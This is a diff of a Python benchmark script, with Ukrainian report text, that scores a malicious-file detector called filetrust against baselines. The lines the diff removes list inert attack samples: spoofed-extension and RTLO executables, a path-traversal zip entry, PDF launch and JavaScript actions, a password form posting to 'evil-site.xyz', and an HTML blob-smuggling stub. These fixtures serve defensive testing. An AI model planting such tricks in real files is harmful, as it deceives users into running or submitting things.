@@ -1,88 +1,162 @@
-
-import io
+import random
 import sys
 import tempfile
-import zipfile
-from pathlib import Path
+import time
+from collections import defaultdict
+from pathlib import Path, PurePath
 
-sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
+HERE = Path(__file__).resolve().parent
+sys.path.insert(0, str(HERE.parent / "src"))
+sys.path.insert(0, str(HERE))
 sys.stdout.reconfigure(encoding="utf-8")
 
-from filetrust.pipeline import analyze          
-from filetrust.scoring.engine import score     
+from filetrust.pipeline import analyze       
+from filetrust.scoring.engine import score    
+import samples                               
 
-THRESHOLD = 30   
+THRESHOLD = 30     
+MIN_RECALL = 0.90   
+MAX_FPR = 0.10
 
-def make_zip(files: dict[str, bytes]) -> bytes:
-    buf = io.BytesIO()
-    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
-        for n, data in files.items():
-            z.writestr(n, data)
-    return buf.getvalue()
-
-
-def pdf(body: str) -> bytes:
-    return (b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog " + body.encode() +
-            b" >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")
+NAIVE_EXEC_EXT = {".exe", ".scr", ".bat", ".cmd", ".js", ".vbs", ".hta",
+                  ".ps1", ".lnk", ".msi", ".jar", ".com"}
+REAL_EXEC_KINDS = {"exe", "elf", "lnk"}
 
 
+def run_all(items, tmp: Path):
+    res = []
+    for i, s in enumerate(items):
+        p = tmp / f"s{i}.bin"
+        p.write_bytes(s.data)
+        t0 = time.perf_counter()
+        info, findings = analyze(p, s.name)
+        ms = (time.perf_counter() - t0) * 1000
+        total, verdict = score(findings)
+        res.append({
+            "s": s, "kind": info.kind, "total": total, "ms": ms,
+            "ids": [f.id for f in findings],
+            "tool": total >= THRESHOLD,
+            "ext": PurePath(s.name).suffix.lower() in NAIVE_EXEC_EXT,
+            "magic": info.kind in REAL_EXEC_KINDS,
+        })
+    return res
 
-SAMPLES = [
-    # нешкідливі 
-    ("notes.txt", b"hello, this is a plain note\n", False),
-    ("page.html", b"<html><body><h1>Hi</h1><a href='https://example.com'>site</a></body></html>", False),
-    ("clean.pdf", pdf("/Pages 2 0 R"), False),
-    ("docs.zip", make_zip({"readme.txt": b"hi", "data.csv": b"a,b\n1,2\n"}), False),
-    ("photos.zip", make_zip({"a.txt": b"x" * 1000, "b.txt": b"y" * 1000}), False),
-    ("login_info.html", b"<html><body><form action='/search'><input name='q'></form></body></html>", False),
-    #  шкідливі імітація  
-    ("invoice.pdf.exe", b"MZ" + b"\x00" * 200, True),
-    ("report.docx.scr", b"MZ" + b"\x00" * 200, True),
-    ("doc\u202egpj.exe", b"MZ" + b"\x00" * 200, True),
-    ("setup.zip", make_zip({"setup.exe": b"MZ" + b"\x00" * 100}), True),
-    ("scan.zip", make_zip({"scan.pdf.exe": b"MZ" + b"\x00" * 100}), True),
-    ("update.zip", make_zip({"../../evil.txt": b"x"}), True),
-    ("launch.pdf", pdf("/OpenAction << /S /Launch /F (cmd.exe) >>"), True),
-    ("js.pdf", pdf("/OpenAction << /S /JavaScript /JS (app.alert(1)) >>"), True),
-    ("embed.pdf", pdf("/Names << /EmbeddedFiles >> /Type /EmbeddedFile /F (payload.exe)"), True),
-    ("login.html", b"<html><form action='http://evil-site.xyz/p'><input type='password'></form></html>", True),
-    ("invoice.html",
-     b"<script>var b=new Blob([atob('TVqQAAMAAAAEAAAA')]);"
-     b"var u=URL.createObjectURL(b);</script>", True),
-]
+
+def confusion(rows, key):
+    tp = sum(1 for r in rows if r["s"].bad and r[key])
+    fn = sum(1 for r in rows if r["s"].bad and not r[key])
+    fp = sum(1 for r in rows if not r["s"].bad and r[key])
+    tn = sum(1 for r in rows if not r["s"].bad and not r[key])
+    return tp, fn, fp, tn
+
+
+def rates(c):
+    tp, fn, fp, tn = c
+    rec = tp / (tp + fn) if tp + fn else 0.0
+    fpr = fp / (fp + tn) if fp + tn else 0.0
+    prec = tp / (tp + fp) if tp + fp else 0.0
+    acc = (tp + tn) / sum(c) if sum(c) else 0.0
+    return rec, fpr, prec, acc
+
+
+def pct(x):
+    return f"{x:.0%}"
+
+
+def robustness(items, tmp: Path):
+    rng = random.Random(99)
+    runs = errors = 0
+    times = []
+    bad_cases = []
+    for s in items[:: max(1, len(items) // 40)]:
+        for tag, data in samples.mutate(s.data, rng):
+            p = tmp / "mut.bin"
+            p.write_bytes(data)
+            runs += 1
+            t0 = time.perf_counter()
+            try:
+                analyze(p, s.name)
+            except Exception as e:   
+                errors += 1
+                bad_cases.append(f"{s.name} [{tag}]: {type(e).__name__}")
+            times.append((time.perf_counter() - t0) * 1000)
+    return runs, errors, times, bad_cases
 
 
 def main():
-    tp = fp = fn = tn = 0
-    rows = []
-    with tempfile.TemporaryDirectory() as tmp:
-        for i, (name, data, bad) in enumerate(SAMPLES):
-            p = Path(tmp) / f"s{i}.bin"
-            p.write_bytes(data)
-            info, findings = analyze(p, name)
-            total, verdict = score(findings)
-            flagged = total >= THRESHOLD
-            ok = flagged == bad
-            if bad and flagged: tp += 1
-            elif bad: fn += 1
-            elif flagged: fp += 1
-            else: tn += 1
-            rows.append((name.replace("\u202e", "<RTLO>"), "шкідливий" if bad else "чистий",
-                         info.kind, total, verdict.split(" ", 1)[1], "✅" if ok else "❌"))
+    items = samples.build_samples()
+    with tempfile.TemporaryDirectory() as t:
+        tmp = Path(t)
+        rows = run_all(items, tmp)
+        runs, errors, rtimes, bad_cases = robustness(items, tmp)
 
-    n = len(SAMPLES)
-    prec = tp / (tp + fp) if tp + fp else 0
-    rec = tp / (tp + fn) if tp + fn else 0
-    acc = (tp + tn) / n
+    dev = [r for r in rows if r["s"].split == "dev"]
+    held = [r for r in rows if r["s"].split == "heldout"]
+    n_bad = sum(r["s"].bad for r in rows)
+    out = ["# Результати оцінки filetrust", "",
+           f"Зразків: {len(rows)} (шкідливих {n_bad}, чистих {len(rows) - n_bad}, "
+           f"з них складних чистих {sum(r['s'].hard for r in rows)}). "
+           f"dev: {len(dev)}, held-out: {len(held)}. Поріг: {THRESHOLD} балів.", "",
+           "## Підсумок", "",
+           "| Метод | Набір | Повнота | Хибні спрацювання | Точність | Загальна |",
+           "|---|---|---|---|---|---|"]
+    for label, key in [("**filetrust**", "tool"), ("Лише розширення", "ext"),
+                       ("Лише libmagic (тип exe/elf/lnk)", "magic")]:
+        for sname, subset in [("dev", dev), ("held-out", held), ("усі", rows)]:
+            rec, fpr, prec, acc = rates(confusion(subset, key))
+            out.append(f"| {label} | {sname} | {pct(rec)} | {pct(fpr)} | {pct(prec)} | {pct(acc)} |")
 
-    out = ["| Зразок | Очікуємо | Тип | Бал | Вердикт | OK |", "|---|---|---|---|---|---|"]
-    out += [f"| {r[0]} | {r[1]} | {r[2]} | {r[3]} | {r[4]} | {r[5]} |" for r in rows]
-    out += ["", f"Зразків: {n} (шкідливих {tp + fn}, чистих {tn + fp}), поріг {THRESHOLD} балів",
-            f"TP={tp}  FN={fn}  FP={fp}  TN={tn}",
-            f"Точність (precision): {prec:.0%}   Повнота (recall): {rec:.0%}   Загальна точність: {acc:.0%}"]
-    text = "\n".join(out)
+    out += ["", "Повнота: частка шкідливих, які позначено. Хибні спрацювання: частка чистих, "
+            "які позначено помилково.", "", "## Повнота за категоріями усі зразки", "",
+            "| Категорія | Кількість | filetrust | Лише розширення | Лише libmagic |",
+            "|---|---|---|---|---|"]
+    bycat = defaultdict(list)
+    for r in rows:
+        if r["s"].bad:
+            bycat[r["s"].category].append(r)
+    for cat, lst in sorted(bycat.items()):
+        cells = [pct(sum(r[k] for r in lst) / len(lst)) for k in ("tool", "ext", "magic")]
+        out.append(f"| {cat} | {len(lst)} | " + " | ".join(cells) + " |")
+
+    hard = [r for r in rows if r["s"].hard]
+    out += ["", f"## Складні чисті файли ({len(hard)})", "",
+            f"Помилково позначено: {sum(r['tool'] for r in hard)} з {len(hard)}.", ""]
+
+    misses = [r for r in rows if r["tool"] != r["s"].bad]
+    out += ["## Помилки filetrust", ""]
+    if misses:
+        out += ["| Зразок | Очікували | Бал | Знахідки |", "|---|---|---|---|"]
+        for r in misses:
+            out.append(f"| {r['s'].name.replace(chr(0x202e), '<RTLO>')} | "
+                       f"{'шкідливий' if r['s'].bad else 'чистий'} | {r['total']} | "
+                       f"{', '.join(r['ids']) or '—'} |")
+    else:
+        out.append("Помилок на цьому наборі немає .")
+
+    ms = sorted(r["ms"] for r in rows)
+    rms = sorted(rtimes)
+    out += ["", "## Швидкість і стійкість", "",
+            f"- Час аналізу на файл: медіана {ms[len(ms)//2]:.1f} мс, максимум {ms[-1]:.1f} мс.",
+            f"- Зіпсовані файли (порожні, обрізані, з випадковими байтами): {runs} запусків, "
+            f"винятків {errors}; максимум {rms[-1]:.1f} мс."]
+    for c in bad_cases[:10]:
+        out.append(f"  - виняток: {c}")
+    out += ["", "## Обмеження", "",
+            "- Набір синтетичний.",
+            "- Зразки інертні (без робочого шкідливого коду), тому вимірюється розпізнавання ознак, "
+            "а не антивірусна здатність.",
+            "- Розподіл dev / held-out зафіксовано правилом заздалегідь, ваги правил підбираються лише за dev, "
+            "held-out слугує для перевірки."]
+
+    text = "\n".join(out) + "\n"
     print(text)
-    Path(__file__).with_name("results.md").write_text(text + "\n", encoding="utf-8")
+    (HERE / "results.md").write_text(text, encoding="utf-8")
+
+    rec, fpr, _, _ = rates(confusion(held, "tool"))
+    if rec < MIN_RECALL or fpr > MAX_FPR:
+        print(f"ПОРОГИ НЕ ДОТРИМАНО: recall={rec:.0%} (мін {MIN_RECALL:.0%}), "
+              f"FPR={fpr:.0%} (макс {MAX_FPR:.0%})")
+        sys.exit(1)
 
 
 if __name__ == "__main__":
